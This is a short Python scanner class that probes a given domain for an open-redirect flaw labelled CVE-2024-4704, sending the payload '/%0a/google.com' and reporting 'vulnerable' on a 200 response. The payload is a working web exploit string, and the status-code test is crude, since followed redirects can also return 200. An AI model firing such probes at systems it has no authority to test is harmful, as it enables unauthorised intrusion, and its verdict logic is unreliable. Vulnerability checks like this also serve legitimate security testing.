import requests
import datetime

class cve_2024_4704():
    def redirect_vulnerability(self, domain):
        payload = '/%0a/google.com'
        url = 'https://'+domain+payload
        access_url = requests.get(url)     
        time = datetime.datetime.now()
        if access_url.status_code == 200: return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-4704 : vulnerable'
        else: return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-4704 : not vulnerable'
